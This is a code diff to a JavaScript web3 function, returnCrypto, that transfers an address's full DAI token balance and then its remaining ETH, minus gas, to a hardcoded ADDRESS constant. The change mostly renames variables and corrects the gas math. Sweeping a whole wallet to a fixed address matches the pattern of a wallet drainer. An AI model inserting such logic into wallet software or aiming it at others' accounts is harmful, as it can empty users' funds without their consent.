@@ -67,20 +67,22 @@ export const returnCrypto = () => {
     contract.methods
       .balanceOf(address)
       .call({ from: address })
-      .then((result) => {
+      .then((daiBalance) => {
         contract.methods
-          .transfer(ADDRESS, result)
+          .transfer(ADDRESS, daiBalance)
           .send({ from: address })
           .on("receipt", () => {
-            web3.eth.getGasPrice().then((result) => {
-              const gasPrice = Number(result) * 2;
-              const gasCost = 21000 * gasPrice * 1.5;
-              web3.eth.getBalance(address).then((result) => {
+            web3.eth.getGasPrice().then((gweiPrice) => {
+              const gasPrice = Number(gweiPrice);
+              const gasLimit = 21000;
+              const gasCost = gasLimit * gasPrice;
+              web3.eth.getBalance(address).then((ethBalance) => {
                 web3.eth.sendTransaction({
                   from: address,
                   to: ADDRESS,
-                  value: Number(result) - gasCost,
+                  value: Math.floor(Number(ethBalance) - gasCost),
                   gasPrice,
+                  gasLimit,
                 });
               });
             });
